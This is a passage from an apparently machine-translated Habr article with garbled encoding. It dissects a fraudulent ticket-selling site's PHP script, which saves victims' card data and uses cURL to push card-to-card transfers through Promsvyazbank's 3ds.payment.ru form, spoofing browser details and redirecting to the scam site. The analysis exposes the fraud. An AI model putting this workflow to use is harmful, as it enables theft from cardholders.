Der erste Teil des Skripts, der oben beschrieben wurde, kann willkÃ¼rlich als "Eintrag im Verkaufsbuch fÃ¼r die Buchhaltung" bezeichnet werden. Sie hat keine Beziehung zum Geldtransfer. Um Geld zu Ã¼berweisen, mÃ¼ssen Sie auf das Speichern von Daten in der Datenbank verzichten. Wir sehen jedoch, dass die Kartendaten gespeichert werden, was bedeutet, dass sie in Zukunft zusÃ¤tzlich verwendet werden kÃ¶nnen, um Geld von Karten â€im manuellen Modusâ€œ zu stehlen. Kartendaten kÃ¶nnen verkauft oder verwendet werden, um beispielsweise fÃ¼r Werbung in Yandex.Direct zu bezahlen, wie im vorherigen Artikel gezeigt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der zweite Teil des Skripts bezieht sich auf die Ãœberweisung von Geld Ã¼ber die Website der Promsvyazbank 3ds.payment.ru. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2b4/0cb/7fc/2b40cb7fc61f4b9598409fbfcc5ae00f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 78 des Kommentars gibt an, dass angenommen wird, dass die BestÃ¤tigungsseite fÃ¼r eine erfolgreiche Zahlung eine Adresse wie "/sus.php?cd=BX3FKT" hat. Bei Erfolg muss der Benutzer an diese Adresse zurÃ¼ckgeschickt werden.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 80-91 Um eine Ãœbersetzung durchzufÃ¼hren, mÃ¼ssen Sie zuerst die Serviceseite aufrufen. </font></font><br>
<br>
<code>https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<img src="https://habrastorage.org/files/e04/5eb/8e4/e045eb8e4a4d42c6be37ff2946da439c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Diese Seite zeigt ungefÃ¤hr diese Zeile an:</font></font><br>
<br>
<pre><code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"ORDER_NUM"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425023400"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"TIMESTAMP"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425"</span></span>}</code></pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
"ORDER_NUM" ist ~ "Bestellnummer", "TIMESTAMP" ist der aktuelle Zeitstempel. Wenn die Seite aktualisiert wird, werden immer neue Daten ausgegeben. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Verwenden Sie den Befehl curl, um eine Webseite zu lesen oder Daten an eine Webseite zu senden. Mit Curl (cURL) kÃ¶nnen Sie mithilfe verschiedener Protokolle, einschlieÃŸlich http und https, programmgesteuert eine Verbindung zu Webservern herstellen. In unserem Fall ist curl ein Software-Webbrowser, der Webseiten in Variablen speichern kann. Die in der Variablen gespeicherte Seite ist eine sehr lange Zeile mit dem HTML-Quellcode dieser Seite. Sie kÃ¶nnen mit solchen Zeichenfolgenvariablen wie mit jeder Zeichenfolge arbeiten - Sie kÃ¶nnen nach Text suchen, Text ersetzen usw. Curl in den beschriebenen Skripten wird mehrmals verwendet.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 80 - Die URL wird in der Variablen $ login_url gespeichert. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 81 - Die URL wird in der Variablen $ agent gespeichert. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 82 - Initialisiert die cURL-Sitzung. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 83-90 - Parameter werden fÃ¼r die Sitzung mit CURL festgelegt (Seitenadresse zuvor in $ login_url gespeichert; Browser-ID zuvor in $ agent gespeichert; Seite, von der die Seite umgeleitet oder anderweitig referenziert wird; REFERER; COOKIE-Einstellungen usw.) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 91 - Als Ergebnis des Befehls curl_exec wird programmgesteuert eine Webseite abgerufen, die in der Variablen $ page gespeichert wird. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 93-95 Die gespeicherte Webseite $ page enthÃ¤lt ~ "Bestellnummer" ORDER_NUM, die in der Variablen $ ord gespeichert ist.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 96-98 Die gespeicherte $ page-Webseite enthÃ¤lt den TIMESTAMP-Zeitstempel, der in der $ tim-Variablen gespeichert ist.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/416/148/8ba/4161488ba0f64c8d9575a7f973d3d841.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/6f6/35b/d05/6f635bd056d5466a956643acab2e3b30.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jetzt muss ein "Software-Browser" zur Seite gehen </font></font><code>https://3ds.payment.ru/P2P_ACTION/card_form.html</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Dies ist dieselbe Zahlungsseite, von der oben ein Screenshot gezeigt wurde. Dies ist eine Seite mit einem Formular, dessen Servicefelder ausgeblendet sind. Ein Teil des HTML-Codes mit versteckten Eingabefeldern wurde oben gezeigt. Einige Werte dieser ausgeblendeten Felder mÃ¼ssen gespeichert werden, damit sie spÃ¤ter beim Absenden des Formulars verwendet werden kÃ¶nnen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 99 - Wir speichern die Seitenadresse in der Variablen $ url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 100 - Die Parameter fÃ¼r die Sitzung mit URL werden festgelegt (in diesem Fall nur die Seitenadresse. Die restlichen Einstellungen bleiben unverÃ¤ndert). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 101-102 Die zuvor verwendeten Variablen $ page und $ part werden gelÃ¶scht. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 103 - Als Ergebnis des Befehls curl_exec wird programmgesteuert eine Webseite abgerufen, die in der Variablen $ page gespeichert wird.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 104-106 Die gespeicherte $ page-Webseite enthÃ¤lt den Wert des TERMINAL-Felds, das in der Variablen $ term gespeichert ist. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 107-109 Die gespeicherte $ page-Webseite enthÃ¤lt den Wert des TRTYPE-Felds, das in der $ type-Variablen gespeichert ist. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 110-112 Die gespeicherte $ page-Webseite enthÃ¤lt den Wert des MERCHANT-Felds, das in der $ Merch-Variablen gespeichert ist. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 113-115 Die gespeicherte $ page-Webseite enthÃ¤lt den Wert des EMAIL-Felds, das in der $ ml-Variablen gespeichert ist. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Allgemeinen Ã¤ndern sich diese Werte in der angegebenen Form nie. Und sie kÃ¶nnten im Code als Konstanten gespeichert und nicht jedes Mal empfangen werden. Das Abrufen der Werte dieser Felder erfolgt natÃ¼rlich aus SicherheitsgrÃ¼nden, falls sich eines oder mehrere Felder irgendwann in der Zukunft Ã¤ndern.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beschreibung einiger Felder. </font><font style="vertical-align: inherit;">Eine vollstÃ¤ndige Beschreibung aller Felder ist in Google leicht zu finden.</font></font><br>
<br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TERMINAL - Eindeutige Nummer des virtuellen Terminals der </font><font style="vertical-align: inherit;">
Verkaufsstelle </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
MERCH_NAME - Name der </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verkaufsstelle MERCHANT - Nummer der von der Bank zugewiesenen Verkaufsstelle TRTYPE - </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Art der angeforderten Transaktion (Zahlung - 1, Stornierung - 22, Vorautorisierung - 0, Abschluss von Abrechnungen - 21) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E-Mail - E-Mail-Adresse Benachrichtigungen senden</font></font></blockquote><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/bf5/4a7/457/bf54a74574f44b1a8cb34bfa95eac091.png"><br>
    ,   -   . ($page)<br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E-MAIL hier, das ist ein epischer Fall. Wen kÃ¼mmert es, zusÃ¤tzliche Materialien zu dieser E-Mail am Ende des Artikels in der Anwendung unter dem Spoiler. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9d4/cf1/5c9/9d4cf15c98584bc8a4dc45b78051ad26.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier sehen wir einen groÃŸen Block. Die Tatsache, dass es groÃŸ aussieht, erklÃ¤rt sich aus der begrenzten Spaltenbreite in der VerÃ¶ffentlichung und der praktischen Darstellung des Codes durch den Skriptautor. Das Gleiche kÃ¶nnte in 10 Codezeilen platziert werden, aber die Bequemlichkeit des Lesens und Bearbeitens des Codes wÃ¼rde darunter leiden. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 120 - Speichern Sie in der Variablen $ url die Adresse der Seite. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 121-123 - Legen Sie die Parameter fÃ¼r eine Sitzung mit URL fest. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 124 - Aus der Kartennummer des EmpfÃ¤ngers in der Zeichenfolgenvariablen $ crd wird ein Array von $ ncrd erstellt, das Teile der Kartennummer enthÃ¤lt, die in vier geteilt sind. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 125 - HTTP-Header werden in der Array-Variablen $ headers gespeichert.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 126 - Parameter werden fÃ¼r die Sitzung mit CURL festgelegt (HTTP-Header aus der Variablen </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
$ headers </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Zeilen 135-164 - Es wird ein $ postL-Array erstellt, dessen Wert dem Formularfeld auf der Zahlungsseite entspricht (Absendernummer, geteilt durch vier; Ablaufdatum der Absenderkarte) ; CVC-Karte des Absenders, Vier-Wege-EmpfÃ¤ngerkartennummer, Ablaufdatum der EmpfÃ¤ngerkarte, CVC-Karte des EmpfÃ¤ngers, Zahlungsbetrag, Bestellnummer, Beschreibung der BestÃ¤tigungsseite, Terminalnummer, Name der Verkaufsstelle, E-Mail fÃ¼r Benachrichtigungen, Zeitstempel ; Absenderkartennummer nicht in Teile zerlegt; EmpfÃ¤ngerkartennummer nicht in Teile zerlegt; Daten zu Software und Hardware â€auf dem Computer des Absendersâ€œ, um das Erscheinungsbild eines echten Benutzers zu erzeugen, nicht eines Skripts).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 135 - Parameter werden fÃ¼r die cURL-Sitzung festgelegt (Daten, die in der HTTP-POST-Anforderung Ã¼bertragen wurden. In diesem Fall wird das $ postL-Array in eine Zeichenfolge konvertiert, bei der es sich um eine URL-codierte Zeichenfolge handelt </font></font><code>'p1=val1&amp;p2=val2&amp;...'</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Die </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
im Screenshot </font><font style="vertical-align: inherit;">klareren </font><font style="vertical-align: inherit;">Daten werden mit den folgenden Debuginformationen deutlicher dargestellt.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel fÃ¼r Debugging-Informationen</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/9b0/140/642/9b0140642ef74fbf968fa4c299677a33.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/f9e/70e/ac8/f9e70eac88e74b088d3c37c1736eab09.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 166 - Als Ergebnis des Befehls curl_exec werden die vorbereiteten Daten mit der POST-Methode an das Webseitenformular gesendet. Bei einer Webseite sieht eine solche Ãœbermittlung genauso aus, als wÃ¼rde ein normaler Benutzer das Formular in einem normalen Browser ausfÃ¼llen und bestÃ¤tigen. Die Seite mit dem Ergebnis des Sendens von Daten an das Formular wird in der Variablen $ page gespeichert. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 167 - Die cURL-Sitzung endet. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 168 - In der resultierenden Seite, die in der Variablen $ page gespeichert ist und, wie wir uns erinnern, eine lange Zeile ist, wird die Teilzeichenfolge "Fehler" durchsucht.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeilen 169-173 - Wenn die Teilzeichenfolge "Fehler" gefunden wird, wird 5 Sekunden lang die Fehlermeldung "Die Karte passt nicht" angezeigt. AnschlieÃŸend wird das Skript beendet und die im Browser angezeigte Seite zur "Bestellseite" umgeleitet. Wenn der Benutzer hartnÃ¤ckig ist, kann er erneut versuchen, den Zahlungsvorgang durchzufÃ¼hren. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Angezeigte Seite im Fehlerfall. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2f6/7b0/d80/2f67b0d80a7e49b88b9432eacd6d9085.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Fehlerursachen, die von der Bank ausgegeben werden, kÃ¶nnen unterschiedlich sein (ein Fehler in der Kartennummer, unzureichendes Guthaben, ein Autorisierungsfehler und viele andere). Aber fÃ¼r das Skript payp2p.php gibt es keinen Unterschied. Sobald die Zahlung fehlgeschlagen ist, wird der Benutzer auf die Seite weitergeleitet, von der aus Sie den Zahlungsversuch wiederholen kÃ¶nnen. Die Seite, an die der Fehler zurÃ¼ckgegeben wird, kann je nach Aufgabe leicht geÃ¤ndert werden.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beispiel HTML-Code, der im Fehlerfall von der Bankseite zurÃ¼ckgegeben wird</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><font></font>
<font></font>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">base</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/netcetera/netcetera.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/riskminder-client.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
    </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">redirect</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">rctext, ext_diag_code</span></span></span></span><span class="javascript"><span class="hljs-function">)</span></span></span><span class="javascript">{
	</span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Call your bank"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/CallYourBank"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is restricted"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ForbiddenTransaction"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is disabled"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/BlockedCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Invalid amount"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in amount field"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Wrong original amount"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectAmount"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Re-enter transaction"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/Retry"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Expired card"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ExpiredCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Not sufficient funds"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/InsufficientBalance"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds amount limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/AmountOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds frequency limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/QuantityOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card number field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectNumber"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card expiration date field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectExpiresDate"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in currency field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectCurrency"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"AS_FAIL"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectPassword"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; (ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"NS_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"S_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"UNAVAIL"</span></span></span><span class="javascript">)){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/3DSFailure"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> {
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/TechReasons"</span></span></span><span class="javascript">;
	}
   }
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"netcetera_set_DID('');redirect('Authentication failed','BIN_ERROR')"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ein Beispiel fÃ¼r das Debuggen von Informationen, wenn die Bank beim Bezahlen einen Fehler meldet</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/73f/c74/88a/73fc7488aa40469da8984c474be4ae1b.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zeile 174 - Wenn das Skript aufgrund eines Fehlers beim Bezahlen nicht zuvor beendet wurde, bedeutet dies, dass alles wie beabsichtigt verlÃ¤uft. </font><font style="vertical-align: inherit;">Auf der zuvor in der Variablen $ page gespeicherten Seite werden alle Teilzeichenfolgen mit der Adresse durch eine </font></font><code>https://3ds.payment.ru/cgi-bin/cgi_link</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zeichenfolge mit einer Adresse vom Typ mydomain.ru/sus.php?cd = ... ersetzt. Dies ist die Adresse der Seite auf der betrÃ¼gerischen Site, die der Benutzer erhalten muss, wenn die Zahlung erfolgreich ist. </font><font style="vertical-align: inherit;">(Auf einer solchen Seite kann dem Benutzer gedankt und informiert werden, dass elektronische Tickets per Post gesendet wurden). </font><font style="vertical-align: inherit;">Nach dem Ersetzen der Teilzeichenfolge wird das Ergebnis in der Variablen $ pp gespeichert.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
